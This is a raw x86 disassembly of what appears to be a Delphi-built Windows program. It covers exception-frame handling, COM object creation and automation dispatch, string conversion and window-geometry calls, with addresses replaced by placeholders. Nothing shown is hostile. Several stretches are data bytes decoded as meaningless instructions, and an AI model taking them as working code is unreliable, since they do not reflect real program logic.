mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_441a58
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_461244
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_403418
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4403bc
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4403bc
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_440a44
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_45ec3c
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_4612a4
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_460ec0
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_460ec0
jmp r-xdata
sub_4616e4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_403fc0
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_403fc0
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_461720
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_441a58
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_441a58
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_44d228
sub_4617b0
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_4617d8
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_461886
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4618df
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4618e6
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_45728c
mov eax sub_45750c
call sub_419cd0
mov eax [ rw-data ]
push eax
call CloseHandle
sub_461990
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcomp [ ecx ]
inc esi
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
shl [ ecx ] 0x1
inc eax
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
inc ebp
js r-xdata
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmpsb [ esi ] [ edi ]
sbb al [ esi ]
sbb [ eax ] al
add [ eax ] al
in al 0x19
inc esi
add [ esp + esi + 0x40 ] ah
outsd
jb r-xdata
sbb ecx [ ebx + 0x2913e803 ]
cli
dec [ ebx - 0x742fd42a ]
retn
jo r-xdata
arpl [ ebp + 0x70 ] sp
je r-xdata
outsd
jb r-xdata
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461980
inc eax
add [ edx + esi ] cl
inc eax
add [ eax * 2 + 0x53656c4f ] cl
jns r-xdata
shl [ eax ] 0x1a
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
sbb al [ esi ]
adc [ eax ] al
add [ eax ] al
mov [ ecx ] ds
inc esi
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
add ebp eax
mov ch 0x6b
imul ebp [ edi + 0x6e ] 0xffffffff
or [ eax ] eax
add [ eax ] al
inc ecx
jo r-xdata
sub edx eax
mov eax ebx
call sub_4045b8
mov eax [ ebx ]
call sub_4086e0
mov esi eax
mov eax [ ebx ]
call sub_40422c
test eax eax
jle r-xdata
outsd
outsb
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ ecx ] cl
inc ebp
dec edi
insb
inc ebp
jb r-xdata
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edx + esi ] cl
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
int3
inc eax
add [ edx + ebx + 0x46 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ edx ] ds
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x1800461a ] ah
add [ eax ] al
add ah ah
sbb [ esi ] eax
xor al 0x40
mov eax [ ebx ]
call sub_40442c
mov edx esi
sub al 0xd
je r-xdata
cli
dec [ ebx - 0x17fc7410 ]
clc
cli
inc [ ebp - 0x75f58140 ]
xchg esp eax
sub bh dl
dec [ ebx + 0x6bb5e803 ]
jb r-xdata
pop esi
pop ebx
retn
sub al 0x21
jb r-xdata
mov al [ esi ]
push es
sar [ esi + 0xa ] 0x8a
insd
outsb
je r-xdata
add [ eax ] al
sub_461af8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_403fc0
mov eax [ ebx ]
call sub_4086e0
mov esi eax
jmp r-xdata
mov eax [ ebx ]
call sub_40422c
test eax eax
jle r-xdata
pop esi
pop ebx
retn
mov al [ esi ]
sub al 0x21
jb r-xdata
mov eax [ ebx ]
call sub_40442c
mov edx esi
sub edx eax
mov eax ebx
call sub_4045b8
mov eax [ ebx ]
call sub_4086e0
mov esi eax
sub al 0xd
je r-xdata
sub_461b48
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_461bef
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx edi
call sub_404004
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403540
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_40ba50
mov [ ebx + 0xc ] esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461bf6
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403f90
retn
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_40b0b0
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405e60
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x8 ]
call sub_408f6c
sub_461bf6
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_461c18
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_461c8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_461af8
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax edi
call sub_461b48
lea eax [ edi + 0x10 ]
mov edx [ ebp + 0x10 ]
call sub_403fc0
lea eax [ edi + 0x14 ]
mov edx [ ebp + 0xc ]
call sub_403fc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461c91
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
add esp 0xfffffff0
call sub_403540
sub_461c91
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_461ce4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push ebx
call StringFromCLSID
call sub_461ccc
mov eax esi
mov edx [ esp ]
call sub_404194
mov eax [ esp ]
push eax
call CoTaskMemFree
pop edx
pop esi
pop ebx
retn
sub_461d10
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
push esp
push ebx
call ProgIDFromCLSID
call sub_461ccc
mov eax esi
mov edx [ esp ]
call sub_404194
mov eax [ esp ]
push eax
call CoTaskMemFree
pop edx
pop esi
pop ebx
retn
sub_461d3c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_40599c
push eax
push r-xdata
push 0x5
push 0x0
push ebx
call CoCreateInstance
call sub_461ccc
pop esi
pop ebx
retn
sub_461d74
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x48 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_404904
xor eax eax
push ebp
push sub_461eb8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402c30
mov eax ebx
call sub_4047d4
mov [ ebp - 0x1c ] eax
push esi
push edi
mov esi r-xdata
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0xc ]
call sub_40599c
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_4047e4
test eax eax
jle r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
mov ebx 0x15
mov [ ebp - 0x4 ] 0x10
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call GetComputerNameA
test eax eax
je r-xdata
mov ebx 0x10
jmp r-xdata
lea eax [ ebp - 0x44 ]
mov edx ebx
call sub_4041f4
mov eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x48 ]
lea edx [ ebp - 0x40 ]
mov ecx 0x10
call sub_4041dc
mov eax [ ebp - 0x48 ]
pop edx
call sub_4080d0
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea eax [ ebp - 0x20 ]
push eax
push ebx
push 0x0
push esi
call [ rw-data ]
call sub_461ccc
mov eax [ ebp - 0x8 ]
call sub_461ccc
mov eax edi
mov edx [ ebp - 0xc ]
call sub_4059b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461ebf
lea eax [ ebp - 0x48 ]
mov edx 0x2
call sub_403f90
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
call sub_4049d4
retn
mov ebx 0x15
jmp r-xdata
sub_461ed8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_461f64
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebx ] eax
lea eax [ ebp - 0x8 ]
call sub_40599c
push eax
push r-xdata
push esi
mov eax [ esi ]
call [ eax ]
call sub_4176d8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461f6b
lea eax [ ebp - 0xc ]
call sub_40599c
lea eax [ ebp - 0x8 ]
call sub_40599c
retn
lea eax [ ebp - 0xc ]
call sub_40599c
push eax
push edi
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
call sub_4176d8
test al al
je r-xdata
push ebx
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
sub_461f84
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_462016
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46201d
lea eax [ ebp - 0x8 ]
call sub_40599c
lea eax [ ebp - 0x4 ]
call sub_40599c
retn
lea eax [ ebp - 0x4 ]
call sub_40599c
push eax
push r-xdata
push esi
mov eax [ esi ]
call [ eax ]
call sub_4176d8
test al al
je r-xdata
lea eax [ ebp - 0x8 ]
call sub_40599c
push eax
push edi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
call sub_4176d8
test al al
je r-xdata
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
call sub_4176d8
test al al
je r-xdata
xor eax eax
mov [ ebx ] eax
sub_462034
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_462136
add [ eax ] al
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_462228
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x4 ]
call sub_40599c
push eax
push 0x0
call GetErrorInfo
test eax eax
jne r-xdata
push esi
push ebx
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_4041f4
mov eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x10 ]
call sub_4041f4
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_4041f4
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_461c18
jmp sub_4039a8
lea eax [ ebp - 0x8 ]
call sub_404678
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
lea eax [ ebp - 0xc ]
call sub_404678
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
lea eax [ ebp - 0x10 ]
call sub_404678
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
sub_4621f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46222f
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403f90
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404690
lea eax [ ebp - 0x4 ]
call sub_40599c
retn
sub_462238
push ebp
mov ebp esp
add esp 0xfffff9b0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x50 ]
mov edx [ r-xdata ]
call sub_404904
xor eax eax
push ebp
push sub_46256b
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x10 ] eax
xor ecx ecx
push ebp
push sub_462548
push [ fs : ecx ]
mov [ fs : ecx ] esp
movzx edi [ esi + 0x1 ]
cmp edi 0x40
jle r-xdata
test edi edi
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
lea eax [ ebp - 0x650 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x8 ]
add eax 0x4
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] edi
xor eax eax
mov al [ esi + 0x2 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
xor eax eax
mov al [ esi ]
cmp eax 0x4
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] eax
mov eax edi
add eax eax
lea eax [ ebp + eax * 8 - 0x650 ]
mov [ ebp - 0x18 ] eax
xor ebx ebx
cmp eax 0x1
jne r-xdata
mov ecx [ ebp - 0x650 ]
and ecx 0xfff
cmp ecx 0x9
jne r-xdata
cmp [ ebp - 0xc ] 0x48
jne r-xdata
mov eax [ ebp - 0x18 ]
mov [ eax ] 0xa
mov eax [ ebp - 0x18 ]
mov [ eax + 0x8 ] 0x80020004
jmp r-xdata
push 0x0
lea ecx [ ebp - 0x50 ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push eax
push 0x0
mov eax [ rw-data ]
push eax
push edx
mov eax [ ebp - 0x4 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ecx ] 0xfffffffd
sub [ ebp - 0x2c ] 0x4
inc [ ebp - 0x24 ]
jmp r-xdata
mov eax 0x8
test al al
je r-xdata
mov edx [ ebp - 0x10 ]
lea edx [ ebp + edx * 8 - 0x250 ]
mov [ ebp - 0x1c ] edx
test al al
je r-xdata
inc ebx
cmp edi ebx
jne r-xdata
mov ebx [ ebp - 0x10 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x50 ]
call sub_462818
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0xc
jne r-xdata
cmp [ ebp - 0xc ] 0xc
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_404d94
mov edx [ ebp - 0x1c ]
mov [ edx ] eax
mov eax [ ebp - 0x1c ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
call sub_404d94
mov edx [ ebp - 0x1c ]
mov [ edx ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x1c ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x4008
mov eax [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
sub [ ebp - 0x18 ] 0x10
mov al [ esi + ebx + 0x3 ]
mov edx eax
and dl 0x7f
and edx 0xff
mov [ ebp - 0xc ] edx
and al 0x80
cmp [ ebp - 0xc ] 0xa
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46254f
mov ebx [ ebp - 0x10 ]
test ebx ebx
je r-xdata
dec ebx
lea eax [ ebp + ebx * 8 - 0x250 ]
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov eax 0x3
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
cmp [ ebp - 0xc ] 0x5
jl r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x100
jne r-xdata
mov eax [ ebp - 0xc ]
or eax 0x4000
mov edx [ ebp - 0x18 ]
mov [ edx ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
cmp [ eax ] 0x100
jne r-xdata
add [ ebp - 0x14 ] 0x4
inc [ ebp - 0x10 ]
jmp r-xdata
retn
dec ebx
mov eax [ ebp + ebx * 8 - 0x250 ]
push eax
call SysFreeString
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
mov ecx [ eax ]
mov eax edx
mov edx eax
mov eax ecx
call sub_404d70
cmp [ ebp - 0xc ] 0x7
jg r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
mov ecx [ ebp - 0x18 ]
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x8 ] edx
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0xc ] eax
add [ ebp - 0x14 ] 0xc
jmp r-xdata
mov eax [ ebp - 0x10 ]
lea eax [ ebp + eax * 8 - 0x250 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
call sub_404d94
mov edx [ ebp - 0x20 ]
mov [ edx ] eax
mov eax [ ebp - 0x20 ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x18 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0x8 ] eax
inc [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov ecx 0x8
call sub_40f9e0
add [ ebp - 0x14 ] 0x4
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x18 ]
mov [ edx + 0xc ] eax
sub_46257c
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9bc
call sub_4039a8
pop ecx
pop ecx
pop ebp
retn
sub_4625b0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x1c ] eax
mov ebx [ ebp - 0x4 ]
xor edi edi
mov [ ebp - 0x8 ] esp
mov eax [ ebp - 0xc ]
inc eax
shl eax 0x2
sub esp eax
lea eax [ ebp - 0x10 ]
mov [ eax ] esp
mov eax [ ebp - 0xc ]
sub eax edi
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
mov [ edx + eax * 4 ] ecx
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
jmp r-xdata
mov eax ebx
call sub_408890
mov esi eax
push 0x0
push 0x0
push esi
push ebx
push 0x0
push 0x0
call MultiByteToWideChar
inc eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
add eax eax
add eax 0x3
and eax 0xfffffffc
sub esp eax
lea eax [ ebp - 0x18 ]
mov [ eax ] esp
test edi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call GetThreadLocale
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
cmp eax 0x80020006
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push esi
push ebx
push 0x0
push 0x0
call MultiByteToWideChar
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
mov [ eax + edx * 2 - 0x2 ] 0x0
inc esi
add ebx esi
inc edi
cmp edi [ ebp - 0xc ]
jne r-xdata
call sub_461ccc
push ebp
call sub_46257c
pop ecx
jmp r-xdata
mov esp [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4626a8
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
mov ebx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ ebx + 0x1 ] 0x40
jbe r-xdata
mov dx [ eax ]
cmp dx 0x9
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
cmp dx 0x4009
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
call sub_462690
mov eax [ eax + 0x8 ]
